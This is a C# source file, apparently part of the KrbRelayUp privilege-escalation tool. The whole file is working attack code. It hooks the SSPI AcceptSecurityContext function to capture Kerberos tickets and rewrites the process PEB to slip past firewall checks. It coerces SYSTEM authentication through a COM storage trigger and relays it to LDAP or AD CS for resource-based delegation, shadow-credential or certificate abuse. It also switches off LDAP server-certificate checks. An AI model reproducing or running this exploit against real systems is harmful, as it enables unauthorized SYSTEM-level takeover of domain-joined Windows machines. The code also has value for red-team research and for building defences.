using KrbRelayUp.Relay.Com;
using NetFwTypeLib;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Text;
using static KrbRelayUp.Relay.Natives;

namespace KrbRelayUp.Relay
{
    public enum RelayAttackType
    {
        RBCD = 1,
        ShadowCred = 2,
        ADCS = 3
    }

    class Relay
    {
        public static Guid clsId_guid = new Guid(Options.clsid);
        public static SECURITY_HANDLE ldap_phCredential = new SECURITY_HANDLE();
        public static IntPtr ld = IntPtr.Zero;
        public static byte[] apRep1 = { };
        public static byte[] apRep2 = { };
        public static byte[] ticket = { };

        public static void InitializeCOMServer()
        {
            //get value for AcceptSecurityContex
            Console.WriteLine("[+] Rewriting function table");
            IntPtr functionTable = InitSecurityInterface();
            SecurityFunctionTable table = (SecurityFunctionTable)Marshal.PtrToStructure(functionTable, typeof(SecurityFunctionTable));

            //overwrite AcceptSecurityContex
            AcceptSecurityContextFunc AcceptSecurityContextDeleg = new AcceptSecurityContextFunc(AcceptSecurityContext_);
            byte[] bAcceptSecurityContext = BitConverter.GetBytes(Marshal.GetFunctionPointerForDelegate(AcceptSecurityContextDeleg).ToInt64());
            int oAcceptSecurityContext = Marshal.OffsetOf(typeof(SecurityFunctionTable), "AcceptSecurityContex").ToInt32();
            Marshal.Copy(bAcceptSecurityContext, 0, functionTable + oAcceptSecurityContext, bAcceptSecurityContext.Length);

            Console.WriteLine("[+] Rewriting PEB");
            //Init RPC server
            var svcs = new[] {
                new SOLE_AUTHENTICATION_SERVICE
                {
                    dwAuthnSvc = 16, // HKLM\SOFTWARE\Microsoft\Rpc\SecurityService sspicli.dll
                    pPrincipalName = Options.relaySPN
                }
            };
            //bypass firewall restriction by overwriting checks on PEB
            string str = SetProcessModuleName("System");
            StringBuilder fileName = new StringBuilder(1024);
            GetModuleFileName(IntPtr.Zero, fileName, fileName.Capacity);
            try
            {
                Console.WriteLine("[+] Init COM server");
                int status = CoInitializeSecurity(IntPtr.Zero, svcs.Length, svcs, IntPtr.Zero, AuthnLevel.RPC_C_AUTHN_LEVEL_DEFAULT, ImpLevel.RPC_C_IMP_LEVEL_IMPERSONATE, IntPtr.Zero, EOLE_AUTHENTICATION_CAPABILITIES.EOAC_DYNAMIC_CLOAKING, IntPtr.Zero);
                if (status != 0)
                {
                    Console.WriteLine($"CoInitializeSecurity Error: 0x{status:X8}. Exploit will fail.");
                    Environment.Exit(0);
                }
            }
            finally
            {
                string str2 = SetProcessModuleName(str);
                fileName.Clear();
                GetModuleFileName(IntPtr.Zero, fileName, fileName.Capacity);
            }
        }

        public static void Run()
        {
            var ldap_ptsExpiry = new SECURITY_INTEGER();
            var status = AcquireCredentialsHandle(null, "Negotiate", 2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref ldap_phCredential, IntPtr.Zero);

            var timeout = new LDAP_TIMEVAL
            {
                tv_sec = (int)(new TimeSpan(0, 0, 60).Ticks / TimeSpan.TicksPerSecond)
            };

            ld = ldap_init(Options.domainController, (uint)Options.ldapPort);


            uint LDAP_OPT_ON = 1;
            uint LDAP_OPT_OFF = 1;
            uint version = 3;
            var ldapStatus = ldap_set_option(ld, 0x11, ref version);

            if (Options.useSSL)
            {
                ldap_get_option(ld, 0x0a, out int lv);  //LDAP_OPT_SSL
                if (lv == 0)
                    ldap_set_option(ld, 0x0a, ref LDAP_OPT_ON);

                ldap_get_option(ld, 0x0095, out lv);  //LDAP_OPT_SIGN
                if (lv == 0)
                    ldap_set_option(ld, 0x0095, ref LDAP_OPT_ON);

                ldap_get_option(ld, 0x0096, out lv);  //LDAP_OPT_ENCRYPT
                if (lv == 0)
                    ldap_set_option(ld, 0x0096, ref LDAP_OPT_ON);

                ldap_set_option(ld, 0x81, Marshal.GetFunctionPointerForDelegate<VERIFYSERVERCERT>((connection, serverCert) => true));
            }

            ldapStatus = ldap_connect(ld, timeout);
            if (ldapStatus != 0)
            {
                Console.WriteLine("[-] Could not connect to {0}. ldap_connect failed with error code 0x{1}", Options.domainController, ldapStatus.ToString("x2"));
                return;
            }

            //Unable to call other com objects before doing the CoInitializeSecurity step
            //Make sure that we'll use an available port
            if (!checkPort(int.Parse(Options.comServerPort)))
            {
                Console.WriteLine("[+] Looking for available ports..");
                Options.comServerPort = checkPorts(new[] { "SYSTEM" }).ToString();
                if (Options.comServerPort == "-1")
                {
                    Console.WriteLine("[-] No available ports found");
                    Console.WriteLine("[-] Firewall will block our COM connection. Exiting");
                    return;
                }
                Console.WriteLine("[+] Port {0} available", Options.comServerPort);
            }

            //COM object
            Console.WriteLine("[+] Register COM server");
            byte[] ba = ComUtils.GetMarshalledObject(new object());
            COMObjRefStandard std = (COMObjRefStandard)COMObjRef.FromArray(ba);

            std.StringBindings.Clear();
            std.StringBindings.Add(new COMStringBinding(RpcTowerId.Tcp, "127.0.0.1"));

            RpcServerUseProtseqEp("ncacn_ip_tcp", 20, Options.comServerPort, IntPtr.Zero);
            RpcServerRegisterAuthInfo(null, 16, IntPtr.Zero, IntPtr.Zero);

            // Initialized IStorage
            IStorage stg;
            ILockBytes lb;
            int result;
            result = Ole32.CreateILockBytesOnHGlobal(IntPtr.Zero, true, out ILockBytes lockBytes);
            result = Ole32.StgCreateDocfileOnILockBytes(lockBytes, Ole32.STGM.CREATE | Ole32.STGM.READWRITE | Ole32.STGM.SHARE_EXCLUSIVE, 0, out IStorage storage);
            Ole32.MULTI_QI[] qis = new Ole32.MULTI_QI[1];
            //insert our ObjRef(std) in the StorageTrigger
            StorageTrigger storageTrigger = new StorageTrigger(storage, "127.0.0.1", TowerProtocol.EPM_PROTOCOL_TCP, std);
            qis[0].pIID = Ole32.IID_IUnknownPtr;
            qis[0].pItf = null;
            qis[0].hr = 0;

            Console.WriteLine("[+] Forcing SYSTEM authentication");
            try
            {
                result = Ole32.CoGetInstanceFromIStorage(null, ref clsId_guid, null, Ole32.CLSCTX.CLSCTX_LOCAL_SERVER, storageTrigger, 1, qis);
            }
            catch (Exception e)
            {
                if (!Options.attackDone)
                    Console.WriteLine(e);
            }
        }

        [STAThread]
        public static SecStatusCode AcceptSecurityContext_([In] SecHandle phCredential, [In] SecHandle phContext, [In] SecurityBufferDescriptor pInput, AcceptContextReqFlags fContextReq, SecDataRep TargetDataRep, [In, Out] SecHandle phNewContext, [In, Out] IntPtr pOutput, out AcceptContextRetFlags pfContextAttr, [Out] SECURITY_INTEGER ptsExpiry)
        {
            //get kerberos tickets sent to our com server
            if (apRep1.Length == 0)
            {
                //ap_req
                ticket = pInput.ToByteArray().Take(pInput.ToByteArray().Length - 32).ToArray();
                int ticketOffset = Helpers.PatternAt(ticket, new byte[] { 0x6e, 0x82 }); // 0x6e, 0x82, 0x06
                ticket = ticket.Skip(ticketOffset).ToArray();
                ticket = Helpers.ConvertApReq(ticket);
                if (ticket[0] != 0x60)
                {
                    Console.WriteLine("[-] Received invalid apReq, exploit will fail");
                    Console.WriteLine("{0}", Helpers.ByteArrayToString(ticket));
                    Environment.Exit(0);
                }
            }
            else
            {
                apRep2 = pInput.ToByteArray().Take(pInput.ToByteArray().Length - 32).ToArray();
                int apRep2Offset = Helpers.PatternAt(apRep2, new byte[] { 0x6f }, true);
                apRep2 = apRep2.Skip(apRep2Offset).ToArray();
                ticket = apRep2;
                
            }

            // Relay Kerberos auth from NT/SYSTEM to LDAP
            if (!Options.attackDone)
            {
                if (Options.relayAttackType == RelayAttackType.ADCS)
                    Http.Relay();
                else
                    Ldap.Relay();
            }

            //overwrite security buffer
            var pOutput2 = new SecurityBufferDescriptor(12288);
            //var buffer = new SecurityBufferDescriptor(msgidbytes);
            var buffer = new SecurityBuffer(apRep1);
            int size = Marshal.SizeOf(buffer);
            int size2 = apRep1.Length;
            var BufferPtr = Marshal.AllocHGlobal(size);
            Marshal.StructureToPtr(buffer, BufferPtr, false);
            byte[] BufferBytes = new byte[size];
            Marshal.Copy(BufferPtr, BufferBytes, 0, size);
            var ogSecDesc = (SecurityBufferDescriptor)Marshal.PtrToStructure(pOutput, typeof(SecurityBufferDescriptor));
            var ogSecBuffer = (SecurityBuffer)Marshal.PtrToStructure(ogSecDesc.BufferPtr, typeof(SecurityBuffer));

            SecStatusCode ret = AcceptSecurityContext(phCredential, phContext, pInput, fContextReq, TargetDataRep, phNewContext, pOutput2, out pfContextAttr, ptsExpiry);

            //overwrite SecurityBuffer bytes
            if (apRep2.Length == 0)
            {
                byte[] nbytes = new byte[254];
                Marshal.Copy(apRep1, 0, ogSecBuffer.Token + 116, apRep1.Length); // verify this 116 offset?
                Marshal.Copy(nbytes, 0, ogSecBuffer.Token + apRep1.Length + 116, nbytes.Length);
            }

            return ret;
        }

        public static string SetProcessModuleName(string s)
        {
            IntPtr hProcess = GetCurrentProcess();
            PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
            UInt32 RetLen = 0;
            IntPtr temp;
            NtQueryInformationProcess(hProcess, 0, ref pbi, Marshal.SizeOf(pbi), ref RetLen);

            //https://docs.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-rtl_user_process_parameters
            IntPtr pProcessParametersOffset = pbi.PebBaseAddress + 0x20;
            byte[] addrBuf = new byte[IntPtr.Size];
            ReadProcessMemory(hProcess, pProcessParametersOffset, addrBuf, addrBuf.Length, out temp);
            IntPtr processParametersOffset = (IntPtr)BitConverter.ToInt64(addrBuf, 0);
            IntPtr imagePathNameOffset = processParametersOffset + 0x060;
            
            //read imagePathName
            byte[] addrBuf2 = new byte[Marshal.SizeOf(typeof(UNICODE_STRING))];
            ReadProcessMemory(hProcess, imagePathNameOffset, addrBuf2, addrBuf2.Length, out temp);
            UNICODE_STRING str = Helpers.ReadStruct<UNICODE_STRING>(addrBuf2);
            byte[] addrBuf3 = new byte[str.Length];
            ReadProcessMemory(hProcess, str.Buffer, addrBuf3, addrBuf3.Length, out temp);
            string oldName = Encoding.Unicode.GetString(addrBuf3);

            //write imagePathName
            byte[] b = Encoding.Unicode.GetBytes(s + "\x00");
            WriteProcessMemory(hProcess, str.Buffer, b, b.Length, out temp);

            CloseHandle(hProcess);
            return oldName;
        }

        public static bool checkPort(int port, string name = "SYSTEM")
        {
            INetFwMgr mgr = (INetFwMgr)Activator.CreateInstance(Type.GetTypeFromProgID("HNetCfg.FwMgr"));
            if (!mgr.LocalPolicy.CurrentProfile.FirewallEnabled)
            {
                return true;
            }
            mgr.IsPortAllowed(name, NET_FW_IP_VERSION_.NET_FW_IP_VERSION_ANY, port, "", NET_FW_IP_PROTOCOL_.NET_FW_IP_PROTOCOL_TCP, out object allowed, out object restricted);
            return (bool)allowed;
        }

        public static int checkPorts(string[] names)
        {
            IPGlobalProperties ipGlobalProperties = IPGlobalProperties.GetIPGlobalProperties();
            IPEndPoint[] tcpConnInfoArray = ipGlobalProperties.GetActiveTcpListeners();
            List<int> tcpPorts = tcpConnInfoArray.Select(i => i.Port).ToList();

            foreach (string name in names)
            {
                for (int i = 1; i < 65535; i++)
                {
                    if (checkPort(i, name) && !tcpPorts.Contains(i))
                    {
                        return i;
                    }
                }
            }
            return -1;
        }

    }
}
